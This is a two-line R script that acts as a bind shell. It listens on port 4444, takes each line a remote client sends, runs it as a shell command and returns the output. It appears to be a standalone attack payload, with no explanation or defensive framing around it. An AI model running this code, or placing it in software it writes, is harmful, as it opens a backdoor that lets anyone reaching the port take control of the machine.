s<-socketConnection(port=4444,blocking=TRUE,server=TRUE,open='r+');
while(TRUE){writeLines(readLines(pipe(readLines(s,1))),s)}